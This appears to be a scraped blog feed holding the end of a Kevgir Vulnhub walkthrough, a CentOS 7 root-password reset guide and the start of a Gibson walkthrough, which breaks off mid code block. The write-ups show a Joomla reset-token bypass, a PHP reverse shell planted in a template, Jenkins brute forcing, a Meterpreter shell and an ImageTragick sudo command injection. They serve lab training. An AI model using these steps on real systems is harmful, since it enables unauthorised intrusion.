</span><span class='line'>Exploit: 1. Go to url : target.com/index.php?option=com_user&view=reset&layout=confirm  2. Write into field "token" char ' and Click OK.  3. Write new password for admin  4. Go to url : target.com/administrator/  5. Login admin with new password 
</span><span class='line'>Vulnerable? Yes</span></code></pre></td></tr></table></div></figure>


<p>This vulnerability is tracked under CVE-2008-3681:</p>

<blockquote><p>components/com_user/models/reset.php in Joomla! 1.5 through 1.5.5 does not properly validate reset tokens, which
allows remote attackers to reset the &ldquo;first enabled user (lowest id)&rdquo; password, typically for the administrator</p></blockquote>

<p>So I followed the directions and went to <a href="http://192.168.217.128:8081/index.php?option=com_user&amp;view=reset&amp;layout=confirm">http://192.168.217.128:8081/index.php?option=com_user&amp;view=reset&amp;layout=confirm</a></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/kevgir/token.jpg" title="token" alt="password reset bypass"></p>

<p>Inside the token field I put a <strong>&lsquo;</strong> and then I was taken to a password reset screen where I changed the admin password and finally logged in:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/kevgir/joomla.jpg" title="joomla" alt="joomla"></p>

<p>Inside the Extensions, there is a Template Manager page, where I selected a template and edited its HTML:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/kevgir/template.jpg" title="template" alt="joomla template"></p>

<p>I copied the source code for PentestMonkey&rsquo;s reverse PHP shell, saved the template and reloaded the main page to be served a new shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnlp 8888
</span><span class='line'>listening on [any] 8888 ...
</span><span class='line'>connect to [192.168.217.132] from (UNKNOWN) [192.168.217.128] 57836
</span><span class='line'>Linux canyoupwnme 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux
</span><span class='line'> 19:40:29 up 39 min,  0 users,  load average: 0.15, 0.11, 0.07
</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span class='line'>/bin/sh: 0: can't access tty; job control turned off
</span><span class='line'>$ </span></code></pre></td></tr></table></div></figure>


<h2>Jenkins</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>9000/tcp  open  http        Jetty winstone-2.9
</span><span class='line'>| http-robots.txt: 1 disallowed entry 
</span><span class='line'>|_/
</span><span class='line'>|_http-server-header: Jetty(winstone-2.9)
</span><span class='line'>|_http-title: Dashboard [Jenkins]</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/pentest/kevgir/jenkins.jpg" title="jenkins" alt="jenkins dashboard"></p>

<p>Jenkins was a new target for me. Let&rsquo;s first understand what it&rsquo;s used for:</p>

<blockquote><p>Jenkins is a self-contained, open source automation server written in Java that can be used to automate all sorts of
tasks related to building, testing, and delivering or deploying software.</p></blockquote>

<p>I searched in Metasploit and found the <code>auxiliary/scanner/http/jenkins_enum</code>module:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(jenkins_enum) &gt; info
</span><span class='line'>
</span><span class='line'>       Name: Jenkins-CI Enumeration
</span><span class='line'>     Module: auxiliary/scanner/http/jenkins_enum
</span><span class='line'>    License: Metasploit Framework License (BSD)
</span><span class='line'>       Rank: Normal
</span><span class='line'>
</span><span class='line'>Provided by:
</span><span class='line'>  Jeff McCutchan
</span><span class='line'>
</span><span class='line'>Basic options:
</span><span class='line'>  Name       Current Setting  Required  Description
</span><span class='line'>  ----       ---------------  --------  -----------
</span><span class='line'>  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
</span><span class='line'>  RHOSTS                      yes       The target address range or CIDR identifier
</span><span class='line'>  RPORT      80               yes       The target port (TCP)
</span><span class='line'>  SSL        false            no        Negotiate SSL/TLS for outgoing connections
</span><span class='line'>  TARGETURI  /jenkins/        yes       The path to the Jenkins-CI application
</span><span class='line'>  THREADS    1                yes       The number of concurrent threads
</span><span class='line'>  VHOST                       no        HTTP server virtual host
</span><span class='line'>
</span><span class='line'>Description:
</span><span class='line'>  This module enumerates a remote Jenkins-CI installation in an 
</span><span class='line'>  unauthenticated manner, including host operating system and Jenkins 
</span><span class='line'>  installation details.</span></code></pre></td></tr></table></div></figure>


<p>I ran the enumeration module. Had to change the path to the root folder before I got any output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(jenkins_enum) &gt; exploit
</span><span class='line'>
</span><span class='line'>[+] 192.168.217.128:9000  - Jenkins Version 1.647
</span><span class='line'>[*] /script restricted (403)
</span><span class='line'>[*] /view/All/newJob restricted (403)
</span><span class='line'>[+] http://192.168.217.128:9000/ - /asynchPeople/ does not require authentication (200)
</span><span class='line'>[*] /systemInfo restricted (403)</span></code></pre></td></tr></table></div></figure>


<p>This information did not mean much to me, but I went to the only folder that returned a 200 code and found the usernames recognized by the server</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/kevgir/jenkins-admin.jpg" title="jenkins admin" alt="jenkins admin"></p>

<p>Knowing now there is an admin user, I went again to the bruteforce route, which was quite successful so far:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Module options (auxiliary/scanner/http/jenkins_login):
</span><span class='line'>
</span><span class='line'>   Name              Current Setting                                     Required  Description
</span><span class='line'>   ----              ---------------                                     --------  -----------
</span><span class='line'>   BLANK_PASSWORDS   false                                               no        Try blank passwords for all users
</span><span class='line'>   BRUTEFORCE_SPEED  5                                                   yes       How fast to bruteforce, from 0 to 5
</span><span class='line'>   DB_ALL_CREDS      false                                               no        Try each user/password couple stored in the current database
</span><span class='line'>   DB_ALL_PASS       false                                               no        Add all passwords in the current database to the list
</span><span class='line'>   DB_ALL_USERS      false                                               no        Add all users in the current database to the list
</span><span class='line'>   HTTP_METHOD       POST                                                yes       The HTTP method to use for the login (Accepted: GET, POST)
</span><span class='line'>   LOGIN_URL         /j_acegi_security_check                             yes       The URL that handles the login process
</span><span class='line'>   PASSWORD                                                              no        A specific password to authenticate with
</span><span class='line'>   PASS_FILE         /usr/share/wordlists/metasploit/unix_passwords.txt  no        File containing passwords, one per line
</span><span class='line'>   Proxies                                                               no        A proxy chain of format type:host:port[,type:host:port][...]
</span><span class='line'>   RHOSTS            192.168.217.128                                     yes       The target address range or CIDR identifier
</span><span class='line'>   RPORT             9000                                                yes       The target port (TCP)
</span><span class='line'>   SSL               false                                               no        Negotiate SSL/TLS for outgoing connections
</span><span class='line'>   STOP_ON_SUCCESS   true                                                yes       Stop guessing when a credential works for a host
</span><span class='line'>   THREADS           1                                                   yes       The number of concurrent threads
</span><span class='line'>   USERNAME          admin                                               no        A specific username to authenticate as
</span><span class='line'>   USERPASS_FILE                                                         no        File containing users and passwords separated by space, one pair per line
</span><span class='line'>   USER_AS_PASS      false                                               no        Try the username as the password for all users
</span><span class='line'>   USER_FILE                                                             no        File containing usernames, one per line
</span><span class='line'>   VERBOSE           true                                                yes       Whether to print output for all attempts
</span><span class='line'>   VHOST                                                                 no        HTTP server virtual host</span></code></pre></td></tr></table></div></figure>


<p>At first it didn&rsquo;t work, because I changed the login URL to correspond to the URL path. But I had to leave it as /j_acegi_security_check (I checked the source code and saw that it was correct), and then it found the credentials admin/hello:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 192.168.217.128:9000 - Login Successful: admin:hello</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>So now I was able to login and look at things and change them. Interestingly, the exploitation didn&rsquo;t stop here. There is a module that also allowed me to get a shell with the credentials:</p>

<blockquote><p>This module uses the Jenkins-CI Groovy script console to execute OS commands using Java.</p></blockquote>

<p>Don&rsquo;t forget to select the target as Linux:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>options
</span><span class='line'>
</span><span class='line'>Module options (exploit/multi/http/jenkins_script_console):
</span><span class='line'>
</span><span class='line'>   Name       Current Setting  Required  Description
</span><span class='line'>   ----       ---------------  --------  -----------
</span><span class='line'>   API_TOKEN                   no        The API token for the specified username
</span><span class='line'>   PASSWORD   hello            no        The password for the specified username
</span><span class='line'>   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
</span><span class='line'>   RHOST      192.168.217.128  yes       The target address
</span><span class='line'>   RPORT      9000             yes       The target port (TCP)
</span><span class='line'>   SRVHOST    192.168.217.132  yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
</span><span class='line'>   SRVPORT    8080             yes       The local port to listen on.
</span><span class='line'>   SSL        false            no        Negotiate SSL/TLS for outgoing connections
</span><span class='line'>   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
</span><span class='line'>   TARGETURI  /                yes       The path to the Jenkins-CI application
</span><span class='line'>   URIPATH                     no        The URI to use for this exploit (default is random)
</span><span class='line'>   USERNAME   admin            no        The username to authenticate as
</span><span class='line'>   VHOST                       no        HTTP server virtual host
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options (linux/x86/meterpreter/reverse_tcp):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   LHOST  192.168.217.132  yes       The listen address
</span><span class='line'>   LPORT  8080             yes       The listen port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   1   Linux</span></code></pre></td></tr></table></div></figure>


<p>And a new shell appears!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(jenkins_script_console) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse TCP handler on 192.168.217.132:8080 
</span><span class='line'>[*] Checking access to the script console
</span><span class='line'>[*] Logging in...
</span><span class='line'>[*] 192.168.217.128:9000 - Sending Linux stager...
</span><span class='line'>[*] Sending stage (849108 bytes) to 192.168.217.128
</span><span class='line'>[*] Meterpreter session 1 opened (192.168.217.132:8080 -&gt; 192.168.217.128:48103) at 2017-12-12 12:49:19 -0500
</span><span class='line'>
</span><span class='line'>meterpreter &gt; 
</span><span class='line'>[!] Deleting /tmp/wE472W payload file</span></code></pre></td></tr></table></div></figure>


<p>Lastly, there were some other open ports, but I couldn&rsquo;t use them for exploitation.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>46201/tcp open  unknown
</span><span class='line'>| fingerprint-strings: 
</span><span class='line'>|   DNSStatusRequest: 
</span><span class='line'>|     Unrecognized protocol:
</span><span class='line'>|   DNSVersionBindReq: 
</span><span class='line'>|     Unrecognized protocol: 
</span><span class='line'>|     version
</span><span class='line'>|_    bind
</span><span class='line'>53180/tcp open  ssh         Apache Mina sshd 0.8.0 (protocol 2.0)
</span><span class='line'>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span><span class='line'>SF-Port46201-TCP:V=7.60%I=7%D=12/2%Time=5A22FB7C%P=x86_64-pc-linux-gnu%r(D
</span><span class='line'>SF:NSVersionBindReq,36,"Unrecognized\x20protocol:\x20\0\x06\x01\0\0\x01\0\
</span><span class='line'>SF:0\0\0\0\0\x07version\x04bind\0\0\x10\0\x03\n")%r(DNSStatusRequest,24,"U
</span><span class='line'>SF:nrecognized\x20protocol:\x20\0\0\x10\0\0\0\0\0\0\0\0\0\n");</span></code></pre></td></tr></table></div></figure>


<p>Interestingly, it was the first time I encountered Apache Mina, so this was a good occasion to learn more about it:</p>

<blockquote><p>Apache MINA is a network application framework which helps users develop high performance and high scalability
network applications easily. It provides an abstract event-driven asynchronous API over various transports such as
TCP/IP and UDP/IP via Java NIO.</p></blockquote>

<p>Well, this was fun box and I learned a lot from it. The bruteforce exercises were interesting, because I could familiarize myself with tools I hadn&rsquo;t used before, like patator and fcrackzip. Rest of the web application vulnerabilities were pretty straightforward, but I liked the Jenkins and Redis ones, which were something fresher than the usual Apache/PHP app challenges. All in all, a great machine to learn more about web app security, and one I strongly recommend.</p>

<h3>Learn more</h3>

<p>Redis security: <a href="http://antirez.com/news/96">http://antirez.com/news/96</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _______________________________________
</span><span class='line'>/ This will be a memorable month -- no  \
</span><span class='line'>\ matter how hard you try to forget it. /
</span><span class='line'> ---------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Resetting root password on CentOS 7]]></title>
    <link href="http://chousensha.github.io/blog/2017/11/11/lfcs-prep-resetting-root-password-on-centos-7/"/>
    <updated>2017-11-11T16:53:18-05:00</updated>
    <id>http://chousensha.github.io/blog/2017/11/11/lfcs-prep-resetting-root-password-on-centos-7</id>
    <content type="html"><![CDATA[<p>So, you got physical access to a machine, but you don&rsquo;t remember (or never knew) the root password. This post will walk you through how to reset the root password on a CentOS 7 system.</p>

<!-- more -->


<p><img class="center" src="http://chousensha.github.io/images/sysadmin/rootreset/boot.png" title="boot" alt="edit grub boot entry"></p>

<p>At the boot menu, press <strong>e</strong> to edit the desired boot entry</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/rootreset/initram.png" title="initram" alt="initram"></p>

<p>Now go to the end of the line that starts with <strong>linux16</strong> (you can quickly do it with <strong>Ctrl-e</strong> or <strong>End</strong> key, <strong>Ctrl-a</strong> or <strong>Home</strong> for the beginning of a line) and add <code>rd.break enforcing=0</code> to it. The first paramenter will interrupt the boot process to drop into a shell, and the second one sets SELinux to permissive mode, needed for a quicker way of resetting the password that doesn&rsquo;t require file relabeling at the end.</p>

<p>Also remove the <strong>rhgb</strong> and <strong>quiet</strong> parameters to see more debugging information. These are described in <a href="https://www.redhat.com/archives/rhl-list/2004-May/msg07775.html">https://www.redhat.com/archives/rhl-list/2004-May/msg07775.html</a></p>

<blockquote><p>rhgb = redhat graphical boot &ndash; This is a GUI mode booting screen with most of the information hidden while the user
sees a rotating activity icon spining and brief information as to what the computer is doing.</p>

<p>quiet = hides the majority of boot messages before rhgb starts. These are supposed to make the common user more
comfortable. They get alarmed about seeing the kernel and initializing messages, so they hide them for their comfort.</p></blockquote>

<p>Next, press <strong>Ctrl-x</strong> to boot with the new options. You will be dropped into an initramfs switch_root shell.</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/rootreset/initramfs.png" title="initramfs switch_root" alt="initramfs switch_root shell"></p>

<p>This could be confusing to someone new. Basically, initramfs is a temporary filesystem loaded into memory, that the kernel can access really early, in order to offload some startup tasks. It is also called early user space, and it takes care of steps that would be too cumbersome to include in the kernel, such as loading kernel modules and drivers needed for boot. This allows the kernel to remain relatively lean and not do by itself all the possible configurations. This initramfs image is a CPIO archive that gets unpacked into a tmpfs (a temporary filesystem stored in memory) and becomes the initial root filesystem.</p>

<p>Now, the filesystem is already mounted read-only inside <code>/sysroot</code>. To makey any changes, you have to mount it as read-write: <code>mount -o remount,rw /sysroot</code></p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/rootreset/sysroot.png" title="sysroot" alt="sysroot mount"></p>

<p>Finally, change the root directory to /sysroot in order to run a shell from it: <code>chroot /sysroot</code>. Now your prompt will change to <code>sh-4.2#</code> and from here you can change the password normally, by using <em>passwd</em>. You should get the message that all authentication tokens updated successfully. Since you updated the password, you changed <em>/etc/shadow</em> and now it won&rsquo;t be labeled correctly with a SELinux security context. You have to force a relabel of all the files at next boot, by creating an <em>.autorelabel</em> file: <code>touch /.autorelabel</code>.</p>

<p>Now type exit twice to exit the chroot environment first and then to exit the initramfs shell which will cause a reboot. The relabeling will take a while, and then you can use the system.</p>

<p>To skip the relabeling process, if you used <em>enforce=0</em>, you can restore the context of the shadow file with <code>restorecon /etc/shadow</code>. Then you have to remember to set SELinux back to enforcing, by running <code>setenforce 1</code></p>

<p>Apparently, when you have an RHCSA exam, you start from getting a machine that you have to reset the root password for, which is really cool. Don&rsquo;t get caught unprepared!</p>

<h3>Learn more</h3>

<p><a href="https://www.certdepot.net/rhel7-interrupt-boot-gain-access-system/">https://www.certdepot.net/rhel7-interrupt-boot-gain-access-system/</a></p>

<p><a href="http://man7.org/linux/man-pages/man7/dracut.cmdline.7.html">Kernel command line parameters</a></p>

<p><a href="https://unix.stackexchange.com/questions/126217/when-would-you-use-pivot-root-over-switch-root">switch_root and initramfs</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _________________________________________
</span><span class='line'>/ Be careful of reading health books, you \
</span><span class='line'>| might die of a misprint.                |
</span><span class='line'>|                                         |
</span><span class='line'>\ -- Mark Twain                           /
</span><span class='line'> -----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Gibson 0.2 walkthrough]]></title>
    <link href="http://chousensha.github.io/blog/2017/10/28/gibson-0-dot-2-walkthrough/"/>
    <updated>2017-10-28T16:10:23-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/10/28/gibson-0-dot-2-walkthrough</id>
    <content type="html"><![CDATA[<p>The Vulnhub machine I picked for today&rsquo;s target is called Gibson. For this challenge, there are also some hints:</p>

<ul>
<li>SSH can forward X11.</li>
<li>The challenge isn&rsquo;t over with root. The flag is not where you expect to find it.</li>
</ul>


<p>Let&rsquo;s see what Gibson has in store for us!</p>

<!-- more -->


<h2>Recon</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT   STATE SERVICE VERSION
</span><span class='line'>22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   1024 fb:f6:d1:57:64:fa:38:66:2d:66:40:12:a4:2f:75:b4 (DSA)
</span><span class='line'>|   2048 32:13:58:ae:32:b0:5d:b9:2a:9c:87:9c:ae:79:3b:2e (RSA)
</span><span class='line'>|_  256 3f:dc:7d:94:2f:86:f1:83:41:db:8c:74:52:f0:49:43 (ECDSA)
</span><span class='line'>80/tcp open  http    Apache httpd 2.4.7
</span><span class='line'>| http-ls: Volume /
</span><span class='line'>| SIZE  TIME              FILENAME
</span><span class='line'>| 273   2016-05-07 13:03  davinci.html
</span><span class='line'>|_
</span><span class='line'>|_http-server-header: Apache/2.4.7 (Ubuntu)
</span><span class='line'>|_http-title: Index of /</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>Looks like we only have SSH and a web server running on this box. The Gibson Mining Corporation page contains a  davinci.html file with a bolded message: <code>The answer you seek will be found by brute force</code>. And the page source also has an interesting comment:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!-- Damn it Margo! Stop setting your password to "god" --&gt;
</span><span class='line'>&lt;!-- at least try and use a different one of the 4 most --&gt;
</span><span class='line'>&lt;!-- common ones! (eugene) --&gt;</span></code></pre></td></tr></table></div></figure>


<p>With this information in hand, I tried SSH&#8217;ing as Margo with password god. That didn&rsquo;t work, but doing it as margo instead got me in. We have a shell on the box already!</p>

<h2>Privilege escalation</h2>

<p>We&rsquo;re in as margo, but we need root. I ran my <a href="https://github.com/chousensha/linux_privcheck">linux_pricheck script</a> and sifted through the output to see what might be helpful. Some of the discoveries:</p>

<ul>
<li>there is a network interface connected to a different subnet:</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>virbr0    Link encap:Ethernet  HWaddr fe:54:00:72:e2:fb  
</span><span class='line'>          inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0
</span><span class='line'>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
</span><span class='line'>          RX packets:7 errors:0 dropped:0 overruns:0 frame:0
</span><span class='line'>          TX packets:17 errors:0 dropped:0 overruns:0 carrier:0
</span><span class='line'>          collisions:0 txqueuelen:0 
</span><span class='line'>          RX bytes:1347 (1.3 KB)  TX bytes:2459 (2.4 KB)</span></code></pre></td></tr></table></div></figure>


<ul>
<li>VNC is running on the localhost:</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tcp        0      0 127.0.0.1:5900          0.0.0.0:*               LISTEN      -               </span></code></pre></td></tr></table></div></figure>


<ul>
<li>user marvo has some sudo privileges that need to be checked out:</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User margo may run the following commands on gibson:
</span><span class='line'>    (ALL) NOPASSWD: /usr/bin/convert</span></code></pre></td></tr></table></div></figure>


<ul>
<li>other users on the host are duke and eugene</li>
</ul>


<p>Alright, we have a solid start. First thing I did was check that convert binary:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>margo@gibson:~$ /usr/bin/convert
</span><span class='line'>Version: ImageMagick 6.7.7-10 2014-03-06 Q16 http://www.imagemagick.org
</span><span class='line'>Copyright: Copyright (C) 1999-2012 ImageMagick Studio LLC
</span><span class='line'>Features: OpenMP    
</span><span class='line'>
</span><span class='line'>Usage: convert [options ...] file [ [options ...] file ...] [options ...] file
</span><span class='line'>[...]</span></code></pre></td></tr></table></div></figure>


<p>ImageMagick? More like <a href="https://www.exploit-db.com/exploits/39767/">ImageTragick</a>. This particular version of the ImageMagick library is vulnerable to command execution due to insufficient filtering in shell characters.</p>

<blockquote><p>Insufficient filtering for filename passed to delegate&rsquo;s command allows
remote code execution during conversion of several file formats.</p>

<p>ImageMagick allows to process files with external libraries. This
feature is called &lsquo;delegate&rsquo;. It is implemented as a system() with command string (&lsquo;command&rsquo;)</p>

<p>One of the default delegate&rsquo;s command is used to handle https requests:</p>

<p>&ldquo;wget&rdquo; -q -O &ldquo;%o&rdquo; &ldquo;<a href="https:%M">https:%M</a>&rdquo;</p>

<p>Due to insufficient %M param filtering it is possible to conduct shell command injection, where %M is the actual
link from the input. It is possible to pass the value like <code>https://example.com"|ls "-la</code> and
execute unexpected &lsquo;ls -la&rsquo;. (wget or curl should be installed)</p></blockquote>

<p>So, the injection would look like this:</p>

<p><code>/usr/bin/convert &lsquo;<a href="https://dummyurl">https://dummyurl</a>"| command"&rsquo; tragic.png</code></p>

<p>And if the command takes arguments:</p>

<p><code>/usr/bin/convert &lsquo;<a href="https://dummyurl">https://dummyurl</a>"| command"-flags&rsquo; tragic.png</code></p>

<p>Of course, you are not limited to the pipe character. You can also use <strong>;</strong>.</p>

<p>Since the convert binary runs with sudo privileges, it is possible to escalate privileges by editing <strong>/etc/sudoers</strong>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>margo@gibson:~$ sudo /usr/bin/convert 'https://dummyurl";vim /etc/sudoers"' tragic.png</span></code></pre></td></tr></table></div></figure>


<p>The sudoers file will pop up in vim, and I gave full access to margo:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
